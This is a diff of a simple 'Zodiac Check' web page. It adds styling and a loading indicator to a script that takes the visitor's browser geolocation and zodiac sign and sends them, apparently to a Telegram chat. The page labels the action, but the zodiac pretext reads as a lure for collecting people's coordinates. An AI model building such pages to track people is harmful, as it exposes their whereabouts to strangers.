@@ -3,29 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Zodiac</title>
+    <title>Zodiac Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background: #f4f4f9;
             text-align: center;
-            margin-top: 50px;
+            padding-top: 50px;
+        }
+        h1 {
+            color: #4CAF50;
+            font-size: 36px;
+        }
+        select {
+            font-size: 18px;
+            padding: 10px;
+            margin: 20px;
         }
         button {
+            font-size: 20px;
             padding: 10px 20px;
             background-color: #4CAF50;
             color: white;
             border: none;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
         button:hover {
             background-color: #45a049;
+        }
+        #locationBtn {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        #loading {
+            font-size: 20px;
+            color: #f39c12;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <h2>Select Your Zodiac Sign</h2>
-    <select id="zodiac" name="zodiac">
+    <h1>Choose Your Zodiac and Share Location</h1>
+
+    <select id="zodiac">
         <option value="Aries">Aries</option>
         <option value="Taurus">Taurus</option>
         <option value="Gemini">Gemini</option>
@@ -40,13 +62,15 @@
         <option value="Pisces">Pisces</option>
     </select>
 
-    <br><br>
-    <button onclick="sendLocation()">Send Location</button>
+    <button id="locationBtn" onclick="sendLocation()">Send Location</button>
+    <div id="loading">Sending location...</div>
 
     <script>
         function sendLocation() {
             const zodiac = document.getElementById("zodiac").value;
-            
+            document.getElementById("loading").style.display = "block";  // Show loading
+
+            // Check if geolocation is available
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
@@ -54,10 +78,12 @@
                     const message = `Zodiac: ${zodiac}, Location: Latitude = ${latitude}, Longitude = ${longitude}`;
                     sendMessageToTelegram(message);
                 }, function(error) {
-                    alert("Error getting location.");
+                    alert("Error getting location: " + error.message);
+                    document.getElementById("loading").style.display = "none";  // Hide loading
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
+                document.getElementById("loading").style.display = "none";  // Hide loading
             }
         }
 
@@ -74,9 +100,11 @@
                     } else {
                         alert("Error sending location.");
                     }
+                    document.getElementById("loading").style.display = "none";  // Hide loading
                 })
                 .catch(error => {
                     alert("Error with the request.");
+                    document.getElementById("loading").style.display = "none";  // Hide loading
                     console.error("Error:", error);
                 });
         }
